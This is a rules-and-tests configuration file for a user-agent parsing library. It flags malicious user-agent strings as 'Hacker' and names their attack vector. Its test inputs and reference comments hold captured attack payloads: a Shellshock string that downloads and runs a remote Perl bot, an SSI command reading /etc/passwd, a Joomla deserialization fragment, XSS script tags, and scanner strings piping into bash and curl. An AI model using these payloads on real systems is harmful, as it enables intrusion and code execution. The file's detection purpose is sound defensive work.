#
# Yet Another UserAgent Analyzer
# Copyright (C) 2013-2016 Niels Basjes
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
#

config:

- matcher:
    require:
    - 'agent{"() {"'
    extract:
    - 'DeviceClass                 :   10000:"Hacker"'
    - 'DeviceBrand                 :   10000:"Hacker"'
    - 'DeviceName                  :   10000:"Hacker"'
    - 'OperatingSystemClass        :   10000:"Hacker"'
    - 'OperatingSystemName         :   10000:"Hacker"'
    - 'OperatingSystemVersion      :   10000:"Hacker"'
    - 'OperatingSystemVersionBuild :   10000:"Hacker"'
    - 'LayoutEngineClass           :   10000:"Hacker"'
    - 'LayoutEngineName            :   10000:"Hacker"'
    - 'LayoutEngineVersion         :   10000:"Hacker"'
    - 'AgentClass                  :   10000:"Hacker"'
    - 'AgentName                   :   10000:"Hacker"'
    - 'AgentVersion                :   10000:"Hacker"'
    - 'HackerAttackVector          :   10000:"Shell Shock"'
    - 'HackerToolkit               :       1:"Unknown"'

- matcher:
    require:
    - 'agent{"('''') {"'
    extract:
    - 'DeviceClass                 :   10000:"Hacker"'
    - 'DeviceBrand                 :   10000:"Hacker"'
    - 'DeviceName                  :   10000:"Hacker"'
    - 'OperatingSystemClass        :   10000:"Hacker"'
    - 'OperatingSystemName         :   10000:"Hacker"'
    - 'OperatingSystemVersion      :   10000:"Hacker"'
    - 'OperatingSystemVersionBuild :   10000:"Hacker"'
    - 'LayoutEngineClass           :   10000:"Hacker"'
    - 'LayoutEngineName            :   10000:"Hacker"'
    - 'LayoutEngineVersion         :   10000:"Hacker"'
    - 'AgentClass                  :   10000:"Hacker"'
    - 'AgentName                   :   10000:"Hacker"'
    - 'AgentVersion                :   10000:"Hacker"'
    - 'HackerAttackVector          :   10000:"Shell Shock"'
    - 'HackerToolkit               :       1:"Unknown"'

- matcher:
    require:
    - 'agent~"() {"'
    extract:
    - 'DeviceClass                 :   10000:"Hacker"'
    - 'DeviceBrand                 :   10000:"Hacker"'
    - 'DeviceName                  :   10000:"Hacker"'
    - 'OperatingSystemClass        :   10000:"Hacker"'
    - 'OperatingSystemName         :   10000:"Hacker"'
    - 'OperatingSystemVersion      :   10000:"Hacker"'
    - 'OperatingSystemVersionBuild :   10000:"Hacker"'
    - 'LayoutEngineClass           :   10000:"Hacker"'
    - 'LayoutEngineName            :   10000:"Hacker"'
    - 'LayoutEngineVersion         :   10000:"Hacker"'
    - 'AgentClass                  :   10000:"Hacker"'
    - 'AgentName                   :   10000:"Hacker"'
    - 'AgentVersion                :   10000:"Hacker"'
    - 'HackerAttackVector          :   10000:"Shell Shock"'
    - 'HackerToolkit               :       1:"Unknown"'

- test:
    input:
      user_agent_string: '() { :;}; /bin/bash -c \""wget -O /tmp/bbb ons.myftp.org/bot.txt; perl /tmp/bbb\""'
    expected:
      DeviceClass                          : 'Hacker'
      DeviceName                           : 'Hacker'
      DeviceBrand                          : 'Hacker'
      DeviceVersion                        : 'Hacker'
      OperatingSystemClass                 : 'Hacker'
      OperatingSystemName                  : 'Hacker'
      OperatingSystemVersion               : 'Hacker'
      OperatingSystemNameVersion           : 'Hacker'
      OperatingSystemVersionBuild          : 'Hacker'
      LayoutEngineClass                    : 'Hacker'
      LayoutEngineName                     : 'Hacker'
      LayoutEngineVersion                  : 'Hacker'
      LayoutEngineVersionMajor             : 'Hacker'
      LayoutEngineNameVersion              : 'Hacker'
      LayoutEngineNameVersionMajor         : 'Hacker'
      AgentClass                           : 'Hacker'
      AgentName                            : 'Hacker'
      AgentVersion                         : 'Hacker'
      AgentVersionMajor                    : 'Hacker'
      AgentNameVersion                     : 'Hacker'
      AgentNameVersionMajor                : 'Hacker'
      HackerAttackVector                   : 'Shell Shock'
      HackerToolkit                        : 'Unknown'
      __SyntaxError__                      : 'true'

- test:
    input:
      user_agent_string: '"() { ignored; }; echo Content-Type: text/plain ; echo ; echo \""bash_cve_2014_6271_rce Output : $((11+70))\"""'
    expected:
      DeviceClass                          : 'Hacker'
      DeviceName                           : 'Hacker'
      DeviceBrand                          : 'Hacker'
      DeviceVersion                        : 'Hacker'
      OperatingSystemClass                 : 'Hacker'
      OperatingSystemName                  : 'Hacker'
      OperatingSystemVersion               : 'Hacker'
      OperatingSystemNameVersion           : 'Hacker'
      OperatingSystemVersionBuild          : 'Hacker'
      LayoutEngineClass                    : 'Hacker'
      LayoutEngineName                     : 'Hacker'
      LayoutEngineVersion                  : 'Hacker'
      LayoutEngineVersionMajor             : 'Hacker'
      LayoutEngineNameVersion              : 'Hacker'
      LayoutEngineNameVersionMajor         : 'Hacker'
      AgentClass                           : 'Hacker'
      AgentName                            : 'Hacker'
      AgentVersion                         : 'Hacker'
      AgentVersionMajor                    : 'Hacker'
      AgentNameVersion                     : 'Hacker'
      AgentNameVersionMajor                : 'Hacker'
      HackerAttackVector                   : 'Shell Shock'
      HackerToolkit                        : 'Unknown'
      __SyntaxError__                      : 'true'


- test:
    input:
      user_agent_string: '('''') { :;}; wget http://whsec.us/20147169/10000646/ff16d94243 #, Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1 WhiteHat Security'
    expected:
      DeviceClass                          : 'Hacker'
      DeviceName                           : 'Hacker'
      DeviceBrand                          : 'Hacker'
      DeviceVersion                        : 'Hacker'
      OperatingSystemClass                 : 'Hacker'
      OperatingSystemName                  : 'Hacker'
      OperatingSystemVersion               : 'Hacker'
      OperatingSystemNameVersion           : 'Hacker'
      OperatingSystemVersionBuild          : 'Hacker'
      LayoutEngineClass                    : 'Hacker'
      LayoutEngineName                     : 'Hacker'
      LayoutEngineVersion                  : 'Hacker'
      LayoutEngineVersionMajor             : 'Hacker'
      LayoutEngineNameVersion              : 'Hacker'
      LayoutEngineNameVersionMajor         : 'Hacker'
      AgentClass                           : 'Hacker'
      AgentName                            : 'Hacker'
      AgentVersion                         : 'Hacker'
      AgentVersionMajor                    : 'Hacker'
      AgentNameVersion                     : 'Hacker'
      AgentNameVersionMajor                : 'Hacker'
      HackerAttackVector                   : 'Shell Shock'
      HackerToolkit                        : 'Unknown'
      __SyntaxError__                      : 'true'


- matcher:
    require:
    - 'agent~"<script>"'
    extract:
    - 'DeviceClass           :   10000:"Hacker"'
    - 'DeviceBrand           :   10000:"Hacker"'
    - 'DeviceName            :   10000:"Hacker"'
    - 'OperatingSystemClass  :   10000:"Hacker"'
    - 'OperatingSystemName   :   10000:"Hacker"'
    - 'OperatingSystemVersion:   10000:"Hacker"'
    - 'LayoutEngineClass     :   10000:"Hacker"'
    - 'LayoutEngineName      :   10000:"Hacker"'
    - 'LayoutEngineVersion   :   10000:"Hacker"'
    - 'AgentClass            :   10000:"Hacker"'
    - 'AgentName             :   10000:"Hacker"'
    - 'AgentVersion          :   10000:"Hacker"'
    - 'HackerAttackVector    :   10000:"Javascript"'
    - 'HackerToolkit         :       1:"Unknown"'

- test:
    input:
      user_agent_string: 'Mozilla/4.0 ()<script>alert(''Compatible'')</script>; <script>alert(''''OS)</script>; <script>alert(''MSIE 6.0'')</script>; ()'
    expected:
      DeviceClass                          : 'Hacker'
      DeviceName                           : 'Hacker'
      DeviceBrand                          : 'Hacker'
      OperatingSystemClass                 : 'Hacker'
      OperatingSystemName                  : 'Hacker'
      OperatingSystemVersion               : 'Hacker'
      OperatingSystemNameVersion           : 'Hacker'
      LayoutEngineClass                    : 'Hacker'
      LayoutEngineName                     : 'Hacker'
      LayoutEngineVersion                  : 'Hacker'
      LayoutEngineVersionMajor             : 'Hacker'
      LayoutEngineNameVersion              : 'Hacker'
      LayoutEngineNameVersionMajor         : 'Hacker'
      AgentClass                           : 'Hacker'
      AgentName                            : 'Hacker'
      AgentVersion                         : 'Hacker'
      AgentVersionMajor                    : 'Hacker'
      AgentNameVersion                     : 'Hacker'
      AgentNameVersionMajor                : 'Hacker'
      HackerAttackVector                   : 'Javascript'
      HackerToolkit                        : 'Unknown'


- matcher:
    require:
    - 'agent~"nessus"'
    extract:
    - 'DeviceClass           :   10000:"Hacker"'
    - 'DeviceBrand           :   10000:"Hacker"'
    - 'DeviceName            :   10000:"Hacker"'
    - 'OperatingSystemClass  :   10000:"Hacker"'
    - 'OperatingSystemName   :   10000:"Hacker"'
    - 'OperatingSystemVersion:   10000:"Hacker"'
    - 'LayoutEngineClass     :   10000:"Hacker"'
    - 'LayoutEngineName      :   10000:"Hacker"'
    - 'LayoutEngineVersion   :   10000:"Hacker"'
    - 'AgentClass            :   10000:"Hacker"'
    - 'AgentName             :   10000:"Hacker"'
    - 'AgentVersion          :   10000:"Hacker"'
    - 'HackerToolkit         :   10000:"Nessus"'

- matcher:
    require:
    - 'agent~"#exec"'
    extract:
    - 'DeviceClass           :   10000:"Hacker"'
    - 'DeviceBrand           :   10000:"Hacker"'
    - 'DeviceName            :   10000:"Hacker"'
    - 'OperatingSystemClass  :   10000:"Hacker"'
    - 'OperatingSystemName   :   10000:"Hacker"'
    - 'OperatingSystemVersion:   10000:"Hacker"'
    - 'LayoutEngineClass     :   10000:"Hacker"'
    - 'LayoutEngineName      :   10000:"Hacker"'
    - 'LayoutEngineVersion   :   10000:"Hacker"'
    - 'AgentClass            :   10000:"Hacker"'
    - 'AgentName             :   10000:"Hacker"'
    - 'AgentVersion          :   10000:"Hacker"'
    - 'HackerAttackVector    :   10000:"Serverside execute"'
    - 'HackerToolkit         :       1:"Unknown"'

- matcher:
    require:
    - 'agent~"#include"'
    extract:
    - 'DeviceClass           :   10000:"Hacker"'
    - 'DeviceBrand           :   10000:"Hacker"'
    - 'DeviceName            :   10000:"Hacker"'
    - 'OperatingSystemClass  :   10000:"Hacker"'
    - 'OperatingSystemName   :   10000:"Hacker"'
    - 'OperatingSystemVersion:   10000:"Hacker"'
    - 'LayoutEngineClass     :   10000:"Hacker"'
    - 'LayoutEngineName      :   10000:"Hacker"'
    - 'LayoutEngineVersion   :   10000:"Hacker"'
    - 'AgentClass            :   10000:"Hacker"'
    - 'AgentName             :   10000:"Hacker"'
    - 'AgentVersion          :   10000:"Hacker"'
    - 'HackerAttackVector    :   10000:"Serverside include"'
    - 'HackerToolkit         :       1:"Unknown"'

- matcher:
    require:
    - 'agent~"nslookup"'
    extract:
    - 'DeviceClass           :   10000:"Hacker"'
    - 'DeviceBrand           :   10000:"Hacker"'
    - 'DeviceName            :   10000:"Hacker"'
    - 'OperatingSystemClass  :   10000:"Hacker"'
    - 'OperatingSystemName   :   10000:"Hacker"'
    - 'OperatingSystemVersion:   10000:"Hacker"'
    - 'LayoutEngineClass     :   10000:"Hacker"'
    - 'LayoutEngineName      :   10000:"Hacker"'
    - 'LayoutEngineVersion   :   10000:"Hacker"'
    - 'AgentClass            :   10000:"Hacker"'
    - 'AgentName             :   10000:"Hacker"'
    - 'AgentVersion          :   10000:"Hacker"'
    - 'HackerAttackVector    :   10000:"Serverside execute"'
    - 'HackerToolkit         :       1:"Unknown"'


- test:
    input:
      user_agent_string: '"nessus=<!--#exec cmd=\""cat /etc/passwd\""-->"'
    expected:
      DeviceClass                          : 'Hacker'
      DeviceName                           : 'Hacker'
      DeviceBrand                          : 'Hacker'
      OperatingSystemClass                 : 'Hacker'
      OperatingSystemName                  : 'Hacker'
      OperatingSystemVersion               : 'Hacker'
      OperatingSystemNameVersion           : 'Hacker'
      LayoutEngineClass                    : 'Hacker'
      LayoutEngineName                     : 'Hacker'
      LayoutEngineVersion                  : 'Hacker'
      LayoutEngineVersionMajor             : 'Hacker'
      LayoutEngineNameVersion              : 'Hacker'
      LayoutEngineNameVersionMajor         : 'Hacker'
      AgentClass                           : 'Hacker'
      AgentName                            : 'Hacker'
      AgentVersion                         : 'Hacker'
      AgentVersionMajor                    : 'Hacker'
      AgentNameVersion                     : 'Hacker'
      AgentNameVersionMajor                : 'Hacker'
      HackerAttackVector                   : 'Serverside execute'
      HackerToolkit                        : 'Nessus'

- test:
    input:
      user_agent_string: '"<!--#exec cmd=\""cat /etc/passwd\""-->"'
    expected:
      DeviceClass                          : 'Hacker'
      DeviceName                           : 'Hacker'
      DeviceBrand                          : 'Hacker'
      OperatingSystemClass                 : 'Hacker'
      OperatingSystemName                  : 'Hacker'
      OperatingSystemVersion               : 'Hacker'
      OperatingSystemNameVersion           : 'Hacker'
      LayoutEngineClass                    : 'Hacker'
      LayoutEngineName                     : 'Hacker'
      LayoutEngineVersion                  : 'Hacker'
      LayoutEngineVersionMajor             : 'Hacker'
      LayoutEngineNameVersion              : 'Hacker'
      LayoutEngineNameVersionMajor         : 'Hacker'
      AgentClass                           : 'Hacker'
      AgentName                            : 'Hacker'
      AgentVersion                         : 'Hacker'
      AgentVersionMajor                    : 'Hacker'
      AgentNameVersion                     : 'Hacker'
      AgentNameVersionMajor                : 'Hacker'
      HackerAttackVector                   : 'Serverside execute'
      HackerToolkit                        : 'Unknown'

- test:
    input:
      user_agent_string: '"nessus=<!--#include file=\""nessus405480938.html\""-->"'
    expected:
      DeviceClass                          : 'Hacker'
      DeviceName                           : 'Hacker'
      DeviceBrand                          : 'Hacker'
      OperatingSystemClass                 : 'Hacker'
      OperatingSystemName                  : 'Hacker'
      OperatingSystemVersion               : 'Hacker'
      OperatingSystemNameVersion           : 'Hacker'
      LayoutEngineClass                    : 'Hacker'
      LayoutEngineName                     : 'Hacker'
      LayoutEngineVersion                  : 'Hacker'
      LayoutEngineVersionMajor             : 'Hacker'
      LayoutEngineNameVersion              : 'Hacker'
      LayoutEngineNameVersionMajor         : 'Hacker'
      AgentClass                           : 'Hacker'
      AgentName                            : 'Hacker'
      AgentVersion                         : 'Hacker'
      AgentVersionMajor                    : 'Hacker'
      AgentNameVersion                     : 'Hacker'
      AgentNameVersionMajor                : 'Hacker'
      HackerAttackVector                   : 'Serverside include'
      HackerToolkit                        : 'Nessus'


- matcher:
    require:
    - 'agent~"JDatabaseDriverMysqli"'
    extract:
    - 'DeviceClass           :   10000:"Hacker"'
    - 'DeviceBrand           :   10000:"Hacker"'
    - 'DeviceName            :   10000:"Hacker"'
    - 'OperatingSystemClass  :   10000:"Hacker"'
    - 'OperatingSystemName   :   10000:"Hacker"'
    - 'OperatingSystemVersion:   10000:"Hacker"'
    - 'LayoutEngineClass     :   10000:"Hacker"'
    - 'LayoutEngineName      :   10000:"Hacker"'
    - 'LayoutEngineVersion   :   10000:"Hacker"'
    - 'AgentClass            :   10000:"Hacker"'
    - 'AgentName             :   10000:"Hacker"'
    - 'AgentVersion          :   10000:"Hacker"'
    - 'HackerAttackVector    :   10000:"Remote exec Joomla"'
    - 'HackerToolkit         :       1:"Unknown"'


# If there are NO products found this is either manipulated or a Hacker.
- matcher:
    require:
    - 'IsNull[agent.product]'
    - 'IsNull[agent.url]'
    - '__SyntaxError__="true"'
    extract:
    - 'DeviceClass                        : 10:"Hacker"'
    - 'DeviceName                         : 10:"Hacker"'
    - 'DeviceBrand                        : 10:"Hacker"'
    - 'DeviceVersion                      : 10:"Hacker"'
    - 'OperatingSystemClass               : 10:"Hacker"'
    - 'OperatingSystemName                : 10:"Hacker"'
    - 'OperatingSystemVersion             : 10:"Hacker"'
    - 'OperatingSystemNameVersion         : 10:"Hacker"'
    - 'LayoutEngineClass                  : 10:"Hacker"'
    - 'LayoutEngineName                   : 10:"Hacker"'
    - 'LayoutEngineVersion                : 10:"Hacker"'
    - 'LayoutEngineVersionMajor           : 10:"Hacker"'
    - 'AgentClass                         : 10:"Hacker"'
    - 'AgentName                          : 10:"Hacker"'
    - 'AgentVersion                       : 10:"Hacker"'
    - 'AgentVersionMajor                  : 10:"Hacker"'
    - 'HackerAttackVector                 : 10:"Unknown"'
    - 'HackerToolkit                      : 10:"Unknown"'
    - 'AgentNameVersion                   : 10:"Hacker"'
    - 'AgentNameVersionMajor              : 10:"Hacker"'

- test:
    input:
      user_agent_string: 'a {'
    expected:
      DeviceClass                          : 'Hacker'
      DeviceName                           : 'Hacker'
      DeviceBrand                          : 'Hacker'
      DeviceVersion                        : 'Hacker'
      OperatingSystemClass                 : 'Hacker'
      OperatingSystemName                  : 'Hacker'
      OperatingSystemVersion               : 'Hacker'
      OperatingSystemNameVersion           : 'Hacker'
      LayoutEngineClass                    : 'Hacker'
      LayoutEngineName                     : 'Hacker'
      LayoutEngineVersion                  : 'Hacker'
      LayoutEngineVersionMajor             : 'Hacker'
      LayoutEngineNameVersion              : 'Hacker'
      LayoutEngineNameVersionMajor         : 'Hacker'
      AgentClass                           : 'Hacker'
      AgentName                            : 'Hacker'
      AgentVersion                         : 'Hacker'
      AgentVersionMajor                    : 'Hacker'
      AgentNameVersion                     : 'Hacker'
      AgentNameVersionMajor                : 'Hacker'
      HackerAttackVector                   : 'Unknown'
      HackerToolkit                        : 'Unknown'
      __SyntaxError__                      : 'true'


# Completely empty --> must be hacker.
- test:
    input:
      user_agent_string: ''
    expected:
      DeviceClass                          : 'Hacker'
      DeviceName                           : 'Hacker'
      DeviceBrand                          : 'Hacker'
      DeviceVersion                        : 'Hacker'
      OperatingSystemClass                 : 'Hacker'
      OperatingSystemName                  : 'Hacker'
      OperatingSystemVersion               : 'Hacker'
      OperatingSystemNameVersion           : 'Hacker'
      LayoutEngineClass                    : 'Hacker'
      LayoutEngineName                     : 'Hacker'
      LayoutEngineVersion                  : 'Hacker'
      LayoutEngineVersionMajor             : 'Hacker'
      LayoutEngineNameVersion              : 'Hacker'
      LayoutEngineNameVersionMajor         : 'Hacker'
      AgentClass                           : 'Hacker'
      AgentName                            : 'Hacker'
      AgentVersion                         : 'Hacker'
      AgentVersionMajor                    : 'Hacker'
      AgentNameVersion                     : 'Hacker'
      AgentNameVersionMajor                : 'Hacker'
      HackerAttackVector                   : 'Unknown'
      HackerToolkit                        : 'Unknown'


- matcher:
    require:
    - 'agent{"("'
    extract:
    - 'DeviceClass                        : 10:"Hacker"'
    - 'DeviceName                         : 10:"Hacker"'
    - 'DeviceBrand                        : 10:"Hacker"'
    - 'DeviceVersion                      : 10:"Hacker"'
    - 'OperatingSystemClass               : 10:"Hacker"'
    - 'OperatingSystemName                : 10:"Hacker"'
    - 'OperatingSystemVersion             : 10:"Hacker"'
    - 'OperatingSystemNameVersion         : 10:"Hacker"'
    - 'LayoutEngineClass                  : 10:"Hacker"'
    - 'LayoutEngineName                   : 10:"Hacker"'
    - 'LayoutEngineVersion                : 10:"Hacker"'
    - 'LayoutEngineVersionMajor           : 10:"Hacker"'
    - 'AgentClass                         : 10:"Hacker"'
    - 'AgentName                          : 10:"Hacker"'
    - 'AgentVersion                       : 10:"Hacker"'
    - 'AgentVersionMajor                  : 10:"Hacker"'
    - 'HackerAttackVector                 : 10:"Unknown"'
    - 'HackerToolkit                      : 10:"Unknown"'
    - 'AgentNameVersion                   : 10:"Hacker"'
    - 'AgentNameVersionMajor              : 10:"Hacker"'


- test:
    input:
      user_agent_string: '"}__test|O:21:\""JDatabaseDriverMysqli\"":3:{s:2:\""fc\"";O:17:\""JSimplepieFactory\"":0:{}s:21:\" Useragent was cut"'
    expected:
      DeviceClass                          : 'Hacker'
      DeviceName                           : 'Hacker'
      DeviceBrand                          : 'Hacker'
      DeviceVersion                        : 'Hacker'
      OperatingSystemClass                 : 'Hacker'
      OperatingSystemName                  : 'Hacker'
      OperatingSystemVersion               : 'Hacker'
      OperatingSystemNameVersion           : 'Hacker'
      LayoutEngineClass                    : 'Hacker'
      LayoutEngineName                     : 'Hacker'
      LayoutEngineVersion                  : 'Hacker'
      LayoutEngineVersionMajor             : 'Hacker'
      LayoutEngineNameVersion              : 'Hacker'
      LayoutEngineNameVersionMajor         : 'Hacker'
      AgentClass                           : 'Hacker'
      AgentName                            : 'Hacker'
      AgentVersion                         : 'Hacker'
      AgentVersionMajor                    : 'Hacker'
      AgentNameVersion                     : 'Hacker'
      AgentNameVersionMajor                : 'Hacker'
      HackerAttackVector                   : 'Remote exec Joomla'
      HackerToolkit                        : 'Unknown'
      __SyntaxError__                      : 'true'



# If there is ONLY a product name and nothing else then this is either manipulated or a Hacker.
- matcher:
    require:
    - 'IsNull[agent.(1)product.(1)version]'
    - 'IsNull[agent.(1)product.(1)comments]'
    - 'IsNull[agent.url]'
    - 'IsNull[agent.(2)product]'
    extract:
    - 'DeviceClass                        : 10:"Hacker"'
    - 'DeviceName                         : 10:"Hacker"'
    - 'DeviceBrand                        : 10:"Hacker"'
    - 'DeviceVersion                      : 10:"Hacker"'
    - 'OperatingSystemClass               : 10:"Hacker"'
    - 'OperatingSystemName                : 10:"Hacker"'
    - 'OperatingSystemVersion             : 10:"Hacker"'
    - 'OperatingSystemNameVersion         : 10:"Hacker"'
    - 'LayoutEngineClass                  : 10:"Hacker"'
    - 'LayoutEngineName                   : 10:"Hacker"'
    - 'LayoutEngineVersion                : 10:"Hacker"'
    - 'LayoutEngineVersionMajor           : 10:"Hacker"'
    - 'AgentClass                         : 10:"Hacker"'
    - 'AgentName                          : 10:"Hacker"'
    - 'AgentVersion                       : 10:"Hacker"'
    - 'AgentVersionMajor                  : 10:"Hacker"'
    - 'HackerAttackVector                 : 10:"Unknown"'
    - 'HackerToolkit                      : 10:"Unknown"'
    - 'AgentNameVersion                   : 10:"Hacker"'
    - 'AgentNameVersionMajor              : 10:"Hacker"'

- test:
    input:
      user_agent_string: "true <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF' || curl -X POST"
    expected:
      DeviceClass                          : 'Hacker'
      DeviceName                           : 'Hacker'
      DeviceBrand                          : 'Hacker'
      DeviceVersion                        : 'Hacker'
      OperatingSystemClass                 : 'Hacker'
      OperatingSystemName                  : 'Hacker'
      OperatingSystemVersion               : 'Hacker'
      OperatingSystemNameVersion           : 'Hacker'
      LayoutEngineClass                    : 'Hacker'
      LayoutEngineName                     : 'Hacker'
      LayoutEngineVersion                  : 'Hacker'
      LayoutEngineVersionMajor             : 'Hacker'
      LayoutEngineNameVersion              : 'Hacker'
      LayoutEngineNameVersionMajor         : 'Hacker'
      AgentClass                           : 'Hacker'
      AgentName                            : 'Hacker'
      AgentVersion                         : 'Hacker'
      AgentVersionMajor                    : 'Hacker'
      AgentNameVersion                     : 'Hacker'
      AgentNameVersionMajor                : 'Hacker'
      HackerAttackVector                   : 'Unknown'
      HackerToolkit                        : 'Unknown'


- test:
    input:
      user_agent_string: '${9999072+10000055}'
    expected:
      DeviceClass                          : 'Hacker'
      DeviceName                           : 'Hacker'
      DeviceBrand                          : 'Hacker'
      DeviceVersion                        : 'Hacker'
      OperatingSystemClass                 : 'Hacker'
      OperatingSystemName                  : 'Hacker'
      OperatingSystemVersion               : 'Hacker'
      OperatingSystemNameVersion           : 'Hacker'
      LayoutEngineClass                    : 'Hacker'
      LayoutEngineName                     : 'Hacker'
      LayoutEngineVersion                  : 'Hacker'
      LayoutEngineVersionMajor             : 'Hacker'
      LayoutEngineNameVersion              : 'Hacker'
      LayoutEngineNameVersionMajor         : 'Hacker'
      AgentClass                           : 'Hacker'
      AgentName                            : 'Hacker'
      AgentVersion                         : 'Hacker'
      AgentVersionMajor                    : 'Hacker'
      AgentNameVersion                     : 'Hacker'
      AgentNameVersionMajor                : 'Hacker'
      HackerAttackVector                   : 'Unknown'
      HackerToolkit                        : 'Unknown'
      __SyntaxError__                      : 'true'



- test:
    input:
      user_agent_string: '${@print(md5(acunetix_wvs_security_test))}\'
    expected:
      DeviceClass                          : 'Hacker'
      DeviceName                           : 'Hacker'
      DeviceBrand                          : 'Hacker'
      DeviceVersion                        : 'Hacker'
      OperatingSystemClass                 : 'Hacker'
      OperatingSystemName                  : 'Hacker'
      OperatingSystemVersion               : 'Hacker'
      OperatingSystemNameVersion           : 'Hacker'
      LayoutEngineClass                    : 'Hacker'
      LayoutEngineName                     : 'Hacker'
      LayoutEngineVersion                  : 'Hacker'
      LayoutEngineVersionMajor             : 'Hacker'
      LayoutEngineNameVersion              : 'Hacker'
      LayoutEngineNameVersionMajor         : 'Hacker'
      AgentClass                           : 'Hacker'
      AgentName                            : 'Hacker'
      AgentVersion                         : 'Hacker'
      AgentVersionMajor                    : 'Hacker'
      AgentNameVersion                     : 'Hacker'
      AgentNameVersionMajor                : 'Hacker'
      HackerAttackVector                   : 'Unknown'
      HackerToolkit                        : 'Unknown'
      __SyntaxError__                      : 'true'



# For reference:
#true <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF' || wget
#
#${9999072+10000055}
#${9999227+9999251}
#${9999754+9999339}
#${@print(md5(acunetix_wvs_security_test))}
#${@print(md5(acunetix_wvs_security_test))}\
#"";print(md5(acunetix_wvs_security_test));$a=""
#
#(for x in {1..200} ; do echo ""for x$x in ; do :""; done; for x in {1..200} ; do echo done ; done) | bash ||%0A/usr/bin/curl -X POST https://www.tinfoilsecurity.com/scanner_phone_home/913c8c97-a67a-49bf-811b-c70ab6252eca
#(for x in {1..200} ; do echo ""for x$x in ; do :""; done; for x in {1..200} ; do echo done ; done) | bash ||%0A/usr/bin/curl -X POST https://www.tinfoilsecurity.com/scanner_phone_home/913c8c97-a67a-49bf-811b-c70ab6252eca%00
#(for x in {1..200} ; do echo ""for x$x in ; do :""; done; for x in {1..200} ; do echo done ; done) | bash ||%0A/usr/bin/curl -X POST https://www.tinfoilsecurity.com/scanner_phone_home/a4009663-272d-4b00-9e52-98f4700aa5a7
#(for x in {1..200} ; do echo ""for x$x in ; do :""; done; for x in {1..200} ; do echo done ; done) | bash ||%0A/usr/bin/curl -X POST https://www.tinfoilsecurity.com/scanner_phone_home/a4009663-272d-4b00-9e52-98f4700aa5a7%00
#(for x in {1..200} ; do echo ""for x$x in ; do :""; done; for x in {1..200} ; do echo done ; done) | bash ||%0A/usr/bin/wget https://www.tinfoilsecurity.com/scanner_phone_home/913c8c97-a67a-49bf-811b-c70ab6252eca --method POST -O /dev/null -q
#(for x in {1..200} ; do echo ""for x$x in ; do :""; done; for x in {1..200} ; do echo done ; done) | bash ||%0A/usr/bin/wget https://www.tinfoilsecurity.com/scanner_phone_home/913c8c97-a67a-49bf-811b-c70ab6252eca --method POST -O /dev/null -q%00
#(for x in {1..200} ; do echo ""for x$x in ; do :""; done; for x in {1..200} ; do echo done ; done) | bash ||%0A/usr/bin/wget https://www.tinfoilsecurity.com/scanner_phone_home/a4009663-272d-4b00-9e52-98f4700aa5a7 --method POST -O /dev/null -q
#(for x in {1..200} ; do echo ""for x$x in ; do :""; done; for x in {1..200} ; do echo done ; done) | bash ||%0A/usr/bin/wget https://www.tinfoilsecurity.com/scanner_phone_home/a4009663-272d-4b00-9e52-98f4700aa5a7 --method POST -O /dev/null -q%00
#(for x in {1..200} ; do echo ""for x$x in ; do :""; done; for x in {1..200} ; do echo done ; done) | bash ||%0A/usr/local/bin/curl -X POST https://www.tinfoilsecurity.com/scanner_phone_home/913c8c97-a67a-49bf-811b-c70ab6252eca

- test:
    input:
      user_agent_string: '(for x in {1..200} ; do echo ""for x$x in ; do :""; done; for x in {1..200} ; do echo done ; done) | bash ||%0A/usr/local/bin/curl -X POST https://www.tinfoilsecurity.com/scanner_phone_home/913c8c97-a67a-49bf-811b-c70ab6252eca'
    expected:
      DeviceClass                          : 'Hacker'
      DeviceName                           : 'Hacker'
      DeviceBrand                          : 'Hacker'
      DeviceVersion                        : 'Hacker'
      OperatingSystemClass                 : 'Hacker'
      OperatingSystemName                  : 'Hacker'
      OperatingSystemVersion               : 'Hacker'
      OperatingSystemNameVersion           : 'Hacker'
      LayoutEngineClass                    : 'Hacker'
      LayoutEngineName                     : 'Hacker'
      LayoutEngineVersion                  : 'Hacker'
      LayoutEngineVersionMajor             : 'Hacker'
      LayoutEngineNameVersion              : 'Hacker'
      LayoutEngineNameVersionMajor         : 'Hacker'
      AgentClass                           : 'Hacker'
      AgentName                            : 'Hacker'
      AgentVersion                         : 'Hacker'
      AgentVersionMajor                    : 'Hacker'
      AgentNameVersion                     : 'Hacker'
      AgentNameVersionMajor                : 'Hacker'
      HackerAttackVector                   : 'Unknown'
      HackerToolkit                        : 'Unknown'
      __SyntaxError__                      : 'true'

# Hackers immitating googlebot --> wrong url
- matcher:
    require:
    - 'agent.(1)product.(1)comments.entry.url="http://www.googlebot.com/bot.html"'
    extract:
    - 'DeviceClass                        : 10001:"Spy"'
    - 'DeviceName                         : 10001:"Googlebot immitator"'
    - 'DeviceBrand                        : 10001:"Hacker"'
    - 'DeviceVersion                      : 10001:"Hacker"'
    - 'OperatingSystemClass               : 10001:"Hacker"'
    - 'OperatingSystemName                : 10001:"Hacker"'
    - 'OperatingSystemVersion             : 10001:"Hacker"'
    - 'OperatingSystemNameVersion         : 10001:"Hacker"'
    - 'LayoutEngineClass                  : 10001:"Hacker"'
    - 'LayoutEngineName                   : 10001:"Hacker"'
    - 'LayoutEngineVersion                : 10001:"Hacker"'
    - 'LayoutEngineVersionMajor           : 10001:"Hacker"'
    - 'AgentClass                         : 10001:"Hacker"'
    - 'AgentName                          : 10001:"Hacker"'
    - 'AgentVersion                       : 10001:"Hacker"'
    - 'AgentVersionMajor                  : 10001:"Hacker"'
    - 'HackerAttackVector                 : 10001:"Spy scraper"'
    - 'HackerToolkit                      : 10001:"Googlebot immitator"'
    - 'AgentNameVersion                   : 10001:"Hacker"'
    - 'AgentNameVersionMajor              : 10001:"Hacker"'

- test:
    input:
